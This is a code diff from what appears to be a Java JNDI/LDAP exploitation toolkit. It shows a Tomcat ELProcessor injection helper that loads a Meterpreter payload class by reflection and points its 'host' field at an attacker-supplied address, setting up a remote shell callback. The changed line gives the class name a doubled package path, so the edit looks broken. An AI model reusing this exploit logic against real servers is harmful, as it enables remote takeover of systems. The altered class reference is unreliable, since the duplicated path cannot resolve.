@@ -159,7 +159,7 @@ public class ELProcessorController implements LdapController {
     // 封装 Tomcat 环境下 ELProcessor 的注入辅助逻辑，保持主控制器简洁。
     private class TomcatBypassHelper {
         String injectInterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
-            Class<?> clazz = Class.forName("com.qi4l.JYso.template.Meterpreter");
+            Class<?> clazz = Class.forName("com.qi4l.JYso.template.com.qi4l.JYso.template.Meterpreter");
             Field host = clazz.getDeclaredField("host");
             host.setAccessible(true);
             host.set(clazz, params[0]);
